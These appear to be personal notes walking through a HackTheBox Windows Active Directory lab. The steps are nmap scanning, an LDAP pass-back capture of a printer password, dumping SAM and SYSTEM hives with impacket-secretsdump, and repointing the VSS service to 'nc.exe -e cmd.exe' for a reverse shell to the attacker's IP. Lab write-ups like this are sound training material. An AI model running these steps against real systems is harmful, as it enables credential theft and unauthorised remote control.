### NMAP

```
sudo nmap -sC -sV -vv -oN nmap-cicada 10.10.11.35
```

https://medium.com/r3d-buck3t/pwning-printers-with-ldap-pass-back-attack-a0d8fa495210

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250606221745.png]]

nc listener
![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250606221724.png]]
- get printer's password :) 

### evil-winrm to login
![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250606235256.png]]
### enumerate for priv esc
```
whoami /all
```

We have _SeBackupPrivilege_
![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250606235218.png]]
### Priv Esc

#### reg save sam and system archives

```
reg save HKLM\SAM SAM
```

```
reg save HKLM\SYSTEM SYSTEM
```

Save reg keys and download reg keys

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250606235353.png]]

#### impacket-secretsdump 

Use secrets dump along with sam and system to get administrator's hash 

```
impacket-secretsdump local -sam sam -system system
```

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250606235637.png]]


### Priv Esc 

#### impacket-psexec

Psexec as admin 

Nope :)


### Enum for Priv Esc

We're part of Server Operators group and can basically upload and change binary paths.

https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/

Services

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250607002909.png]]

Upload nc.exe 

```
cp /usr/share/windows-resources/binaries/nc.exe .
```

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250607003214.png]]

Set up nc listener on port 4444

Replace binary path 
```
sc.exe config VSS binPath="C:\Users\svc-printer\nc.exe -e cmd.exe 10.10.14.10 4444"
```
![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250607004529.png]]

![[HackTheBox/Windows Active Directory/attachments/Pasted image 20250607004627.png]]